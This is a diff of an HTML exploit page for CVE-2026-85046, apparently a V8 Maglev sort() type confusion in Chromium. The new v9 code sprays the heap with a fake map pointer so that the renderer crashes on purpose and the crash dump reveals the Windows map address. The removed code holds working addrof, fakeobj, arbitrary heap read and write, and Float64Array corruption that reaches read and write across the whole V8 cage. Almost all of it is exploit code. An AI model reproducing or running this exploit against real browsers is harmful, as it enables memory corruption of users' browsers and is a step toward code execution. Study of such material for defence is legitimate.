@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Windows three-stage reclaim diagnostic v8</title>
+    <title>CVE-2026-85046 - Windows map-calibration diagnostic v9</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -179,7 +179,7 @@
       var running = false;
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v8-last");
+        var previousDiagnostic = localStorage.getItem("f022-v9-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
@@ -308,18 +308,18 @@
       //   phase selects which 4-byte alignment the window starts are placed at
       //   (0 => 0-mod-8, 4 => 4-mod-8) so it always matches the dangling address.
       // ---------------------------------------------------------------------------
-      function makeSprayTemplate(n, victim_elems_tagged, phase) {
+      function makeSprayTemplate(n, victim_elems_tagged, phase, fake_map_tagged) {
         var t;
 
         if (phase === 0) {
-          var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+          var hdr = w2f(fake_map_tagged, EMPTY_PROPERTIES);
           var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
 
           t = new Array(n).fill(hdr);
           for (var i = 1; i < t.length; i += 2) t[i] = pair;
         } else {
           var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
-          var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
+          var even = w2f(FAKE_LEN_SMI, fake_map_tagged);
 
           t = new Array(n).fill(odd);
           for (var i = 1; i < t.length; i += 2) t[i] = even;
@@ -332,9 +332,9 @@
       // on exactly the same boundary.  The templates are built once; the actual
       // pressure comes from slice() copies, avoiding a throwaway holey backing
       // allocation for every sprayed window.
-      function sprayControlled(victim_elems_tagged, phase, groups) {
-        var tA = makeSprayTemplate(0x3fff, victim_elems_tagged, phase);
-        var tB = makeSprayTemplate(0x3ffb, victim_elems_tagged, phase);
+      function sprayControlled(victim_elems_tagged, phase, groups, fake_map_tagged) {
+        var tA = makeSprayTemplate(0x3fff, victim_elems_tagged, phase, fake_map_tagged);
+        var tB = makeSprayTemplate(0x3ffb, victim_elems_tagged, phase, fake_map_tagged);
         var keep = null;
 
         // One group is roughly 512 KiB of FixedDoubleArray backing allocation.
@@ -421,6 +421,19 @@
         // stale address's semispace becomes allocatable and gets sprayed over.
         // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
         // and re-cover the dead address even at a deep offset.
+        // v9 one-shot Windows map calibration:
+        //
+        // Instead of using the Linux PACKED_DOUBLE_MAP constant, make the fake
+        // object's `map` field point at the real victim JSArray itself.  The
+        // validation access below is expected to crash because a JSArray is not
+        // a Map.  The crash dump will then contain/register-reference the real
+        // victim header, whose first 32-bit word is the exact Canva/Windows
+        // PACKED_DOUBLE_ELEMENTS map pointer we need for v10.
+        var calibration_map_tagged = (victim_base | 1) >>> 0;
+        dbg("      [5.5] v9 calibration map -> victim: " +
+            hex(calibration_map_tagged) +
+            " (intentional one-shot crash expected after reclaim)");
+
         // Reference exploit uses three distinct allocation phases:
         //   stage 1 -> first post-bug Scavenge
         //   stage 2 -> second Scavenge, stale semispace becomes active again
@@ -434,7 +447,7 @@
 
         try {
           localStorage.setItem(
-            "f022-v8-last",
+            "f022-v9-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
@@ -444,7 +457,8 @@
               stageGroups: stageGroups,
               stageApproxMiB: 8,
               totalApproxMiB: 24,
-              expectedMap: hex(PACKED_DOUBLE_MAP),
+              linuxExpectedMap: hex(PACKED_DOUBLE_MAP),
+              calibrationMapTagged: hex(calibration_map_tagged),
               expectedEmptyProperties: hex(EMPTY_PROPERTIES),
               expectedLengthWord: hex(FAKE_LEN_SMI),
             }),
@@ -452,15 +466,15 @@
         } catch (_) {}
 
         dbg("      [6.1] spray stage 1: ~8 MiB...");
-        var sprayKeep1 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        var sprayKeep1 = sprayControlled(victim_elems_tagged, pattern, stageGroups, calibration_map_tagged);
 
         dbg("      [6.2] spray stage 2: ~8 MiB...");
         sprayKeep1 = null;
-        var sprayKeep2 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        var sprayKeep2 = sprayControlled(victim_elems_tagged, pattern, stageGroups, calibration_map_tagged);
 
         dbg("      [6.3] spray stage 3: ~8 MiB...");
         sprayKeep2 = null;
-        var sprayKeep3 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        var sprayKeep3 = sprayControlled(victim_elems_tagged, pattern, stageGroups, calibration_map_tagged);
 
         // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
         // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -475,325 +489,38 @@
         }
 
         var master = bad[2];
-        dbg("      [7] bad[2] read done, validating...");
+        dbg("      [7] bad[2] read done; entering map calibration...");
 
         if (master === null || master === undefined)
-          throw new Error("bad[2] is empty");
+          throw new Error("bad[2] is empty before calibration");
 
         var masterType = typeof master;
         dbg("      [7.0] typeof bad[2]=" + masterType);
-
         if (masterType !== "object") {
-          var masterValue = "<unprintable>";
-          var staleSlotText = "<unavailable>";
-          var staleSlotAddr = "<unavailable>";
-
-          try { masterValue = String(master); } catch (_) {}
-          try {
-            staleSlotText = String(bad).split(",")[2];
-            var staleSlotNum = Number(staleSlotText);
-            if (Number.isFinite(staleSlotNum)) {
-              staleSlotAddr = hex((staleSlotNum * 2) >>> 0);
-            }
-          } catch (_) {}
-
-          dbg("      [7.0] bad[2] value=" + masterValue);
-          dbg("      [7.0] String(bad)[2]=" + staleSlotText +
-              " -> " + staleSlotAddr +
-              " expected stale=" + hex(dead_addr));
-
           throw new Error(
-            "bad[2] is not an object (typeof=" + masterType + ")",
-          );
-        }
-
-        dbg("      [7.1] attempting fake-JSArray length validation...");
-        var len = master.length;
-        dbg("      [7.2] master.length=" + len);
-
-        if (len !== 32)
-          throw new Error(
-            "stale object was not reclaimed as the intended fake JSArray " +
-              "(master.length=" +
-              len +
+            "reclaim did not produce a heap object for calibration (typeof=" +
+              masterType +
               ")",
           );
-        if (f2w0(master[0]) !== PACKED_DOUBLE_MAP)
-          throw new Error("map word mismatch");
-        if (f2w1(master[0]) !== EMPTY_PROPERTIES)
-          throw new Error("properties word mismatch");
-        if (f2w1(master[1]) !== 6)
-          throw new Error("victim.length word mismatch");
-
-        var victim_orig_elems = f2w0(master[1]); // victim's REAL elements pointer (for restore)
-
-        // Plain array — the caller unpacks into locals and drops it immediately,
-        // so no field of this object is reachable from any heap root afterwards.
-        return [master, victim, victim_base, victim_orig_elems, dead_addr];
-      }
-
-      // ---------------------------------------------------------------------------
-      // Durable primitives — master[0]/[1] alias the victim JSArray header words:
-      //   master[0] <-> victim [map|properties]
-      //   master[1] <-> victim [elements|length]
-      // master and victim are ALWAYS passed as parameters (stack slots) — never
-      // captured in globals or closures (see attempt_fakeobj header comment).
-      // ---------------------------------------------------------------------------
-      function addr_of(master, victim, o) {
-        // returns TAGGED compressed pointer
-        master[0] = w2f(PACKED_ELEMENTS_MAP, EMPTY_PROPERTIES); // victim map -> PACKED_ELEMENTS
-        victim[0] = o; // tagged store into slot 0
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES); // flip back
-        var t = f2w0(victim[0]); // low word = compressed ptr
-        victim[0] = 1.22; // restore slot 0: leaves no stale pointer for later GCs
-        return t;
-      }
-
-      function heap_read_w01(master, victim, addr) {
-        // addr: UNTAGGED even; returns [w0, w1]
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(((addr - 8) | 1) >>> 0, FAKE_LEN_SMI); // victim.elements = addr-8
-        var d = victim[0]; // double at (addr-8)+8 = addr
-        return [f2w0(d), f2w1(d)];
-      }
-
-      function heap_write_ww(master, victim, addr, w0, w1) {
-        // writes [w0][w1] at addr
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(((addr - 8) | 1) >>> 0, FAKE_LEN_SMI);
-        victim[0] = w2f(w0, w1);
-      }
-
-      function restore_victim(master, victim, orig_elems) {
-        // put the header back; heap stays sane
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        master[1] = w2f(orig_elems, 6); // real elements + Smi(3) length
-      }
-
-      function w2str(w) {
-        // little-endian 32-bit word -> 4 ASCII chars
-        return String.fromCharCode(
-          w & 0xff,
-          (w >>> 8) & 0xff,
-          (w >>> 16) & 0xff,
-          (w >>> 24) & 0xff,
-        );
-      }
-
-      // ---------------------------------------------------------------------------
-      // Main
-      // ---------------------------------------------------------------------------
-      function runExploit() {
-        log("=== CVE-2026-85046 — V8 Maglev sort() Type Confusion ===");
-        log("");
-
-        var ua = navigator.userAgent;
-        var vm = ua.match(/Chrom(?:e|ium)\/(\d+)\./);
-        var majorVer = vm ? parseInt(vm[1]) : 0;
-        log("Chromium major version: " + majorVer);
-        if (majorVer >= 152) {
-          log(
-            "WARNING: version >= 152 is PATCHED (sort no longer inlined on mixed kinds).",
-          );
-          log("");
         }
 
-        // ================= Step 1: train Maglev =================
-        log(
-          "[*] Step 1: Training Maglev with mixed element kinds (8000 iterations)...",
-        );
-        for (var i = 0; i < 8000; i++) {
-          confuse([6, 9, 4, 2, 0]); // PACKED_SMI_ELEMENTS
-          confuse([{}, {}, {}]); // PACKED_ELEMENTS
-        }
-        for (var settle = 0; settle < 32; settle++) confuse([1, 2]);
-        log("    Training complete.");
+        dbg("      [7.1] INTENTIONAL CALIBRATION ACCESS: master.length");
+        dbg("      [7.1] expected fake map target (real victim) = " +
+            hex(calibration_map_tagged));
 
-        // ================= Step 2: trigger + addrof proof =================
-        log("");
-        log("[*] Step 2: Triggering confusion + addrof primitive...");
-        var demo = [{ a: 1 }, { a: 2 }, { a: 3 }];
-        confuse(demo);
-        var strRep = String(demo);
-        log("    String(bad)  = " + strRep);
-        var parts = strRep.split(",");
-        var looksLikeAddresses =
-          parts.length >= 2 &&
-          parts.every(function (s) {
-            var n = Number(s);
-            return Number.isInteger(n) && n > 100000 && n < 4294967296;
-          });
-        if (!looksLikeAddresses) {
-          log(
-            "    First trigger was not optimized; applying an additional warm-up...",
-          );
-          for (var retryWarmup = 0; retryWarmup < 12000; retryWarmup++) {
-            confuse([6, 9, 4, 2, 0]);
-            confuse([{}, {}, {}]);
-          }
-          demo = [{ a: 1 }, { a: 2 }, { a: 3 }];
-          confuse(demo);
-          strRep = String(demo);
-          log("    Retry String(bad) = " + strRep);
-          parts = strRep.split(",");
-          looksLikeAddresses =
-            parts.length >= 2 &&
-            parts.every(function (s) {
-              var n = Number(s);
-              return Number.isInteger(n) && n > 100000 && n < 4294967296;
-            });
-        }
-        if (!looksLikeAddresses) {
-          log(
-            "    No confusion detected — see notes at the bottom of the page.",
-          );
-          var fixedResult = {
-            outcome: "type-confusion-not-observed",
-            addrof: false,
-            fakeobj: false,
-            boundedCageRw: false,
-            externalNetworkUsed: false,
-            nativeCodeExecutionAttempted: false,
-            sandboxEscapeAttempted: false,
-          };
-          window.probeResult = fixedResult;
-          document.getElementById("output").textContent =
-            JSON.stringify(fixedResult);
-          return;
-        } else {
-          log(
-            "    VULNERABILITY CONFIRMED — object pointers read as Smi heap addresses.",
-          );
-          log(
-            "    addrof({a:1}) = " +
-              hex(addrof_leak(demo[0])) +
-              "  (compressed, untagged)",
-          );
-        }
+        // EXPECTED TO CRASH:
+        // V8 will decompress the fake object's map pointer to the real victim
+        // JSArray and interpret the victim header as Map metadata.  Crashpad's
+        // dump lets us read victim+0, i.e. the true Windows PACKED_DOUBLE map.
+        var calibration_len = master.length;
 
-        // ================= Step 3: fakeobj =================
-        log("");
-        log(
-          "[*] Step 3: fakeobj — write-barrier skip + GC reclaim (may take a few seconds)...",
-        );
+        // Reaching here is unexpected but useful.
+        dbg("      [7.2] calibration unexpectedly survived; length=" +
+            calibration_len);
+        throw new Error("v9 calibration access unexpectedly survived");
 
-        // Pre-create every demo target BEFORE the reclaim: after `master` exists,
-        // each sprayed array is unreferenced garbage, so we keep the post-reclaim
-        // window nearly allocation-free to avoid a scavenge recycling it.
-        var scratch = [1.1, 2.2, 3.3]; // owned write-proof target
-        var rw = new Float64Array(8);
-        var box = [{}, {}];
+        return;
 
-        var master = null,
-          victim = null,
-          victim_base = 0,
-          victim_orig_elems = 0,
-          master_addr = 0;
-        var attempts = 0,
-          maxAttempts = 1;
-        while (!master && attempts < maxAttempts) {
-          attempts++;
-          window.f022SprayAttempt = attempts;
-          log(
-            "    Attempt " +
-              attempts +
-              "/" +
-              maxAttempts +
-              ": promote -> confuse -> unshift -> spray...",
-          );
-          try {
-            var st = attempt_fakeobj();
-            master = st[0];
-            victim = st[1];
-            victim_base = st[2];
-            victim_orig_elems = st[3];
-            master_addr = st[4];
-            st = null; // drop the carrier array — master now lives only in locals
-          } catch (e) {
-            log("      failed: " + e.message);
-            master = null;
-          }
-        }
-        if (!master) {
-          log("");
-          log(
-            "[!] fakeobj reclaim did not land after " +
-              maxAttempts +
-              " attempts.",
-          );
-          log("    The reclaim is GC-timing dependent — reload and run again.");
-          return;
-        }
-        // Allocation-minimal owned-memory proof. Do not log or allocate between
-        // obtaining the fake object and restoring the victim header.
-        master[0] = w2f(PACKED_ELEMENTS_MAP, EMPTY_PROPERTIES);
-        victim[0] = scratch;
-        master[0] = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-        var scratch_tagged = f2w0(victim[0]);
-        victim[0] = 1.22;
-
-        master[1] = w2f((((scratch_tagged - 1) >>> 0) | 1) >>> 0, FAKE_LEN_SMI);
-        var scratch_header = victim[0];
-        var scratch_elements = f2w0(scratch_header);
-        var observed_length_word = f2w1(scratch_header);
-
-        master[1] = w2f(scratch_elements, FAKE_LEN_SMI);
-        victim[0] = 13.37;
-        var write_proof_ok = scratch[0] === 13.37;
-
-        master[1] = w2f(victim_orig_elems, 6);
-        var rw_tagged = addr_of(master, victim, rw);
-        var rw_address = untag(rw_tagged);
-        var rw_backing_pair = heap_read_w01(master, victim, rw_address + 56);
-        var rw_backing_high = rw_backing_pair[1];
-        master[1] = w2f(victim_orig_elems, 6);
-        var box_tagged = addr_of(master, victim, box);
-        var box_header = heap_read_w01(master, victim, untag(box_tagged) + 8);
-        var box_elements = box_header[0];
-
-        // Expand only the owned Float64Array to cover the V8 cage. The high word
-        // of its existing sandboxed backing pointer is retained.
-        heap_write_ww(master, victim, rw_address + 32, 0, 0x20000000);
-        heap_write_ww(master, victim, rw_address + 48, 0x04000000, 0);
-        heap_write_ww(master, victim, rw_address + 56, 0, rw_backing_high);
-
-        restore_victim(master, victim, victim_orig_elems);
-
-        cage_rw = rw;
-        object_box = box;
-        box_slot = untag(box_elements) + 8;
-        proof_obj = scratch;
-
-        var scratch_data = untag(scratch_elements) + 8;
-        var saved_low = cageRead32(scratch_data);
-        var saved_high = cageRead32(scratch_data + 4);
-        cageWrite32(scratch_data, f2w0(42.42));
-        cageWrite32(scratch_data + 4, f2w1(42.42));
-        var full_cage_write_ok = scratch[0] === 42.42;
-        cageWrite32(scratch_data, saved_low);
-        cageWrite32(scratch_data + 4, saved_high);
-        var restored = scratch[0] === 13.37;
-
-        var bounded = {
-          outcome:
-            write_proof_ok && full_cage_write_ok && restored
-              ? "full-cage-rw-confirmed"
-              : "full-cage-rw-failed",
-          addrof: looksLikeAddresses,
-          fakeobj: true,
-          scratchTagged: hex(scratch_tagged),
-          scratchElements: hex(scratch_elements),
-          scratchLengthWord: observed_length_word,
-          scratchValueAfter: scratch[0],
-          fullCageWriteObserved: full_cage_write_ok,
-          fullCageWriteRestored: restored,
-          ownedMemoryOnly: true,
-          externalNetworkUsed: false,
-          nativeCodeExecutionAttempted: false,
-          sandboxEscapeAttempted: false,
-        };
-        window.probeResult = bounded;
-        document.getElementById("output").textContent = JSON.stringify(bounded);
       }
 
       function log(msg) {
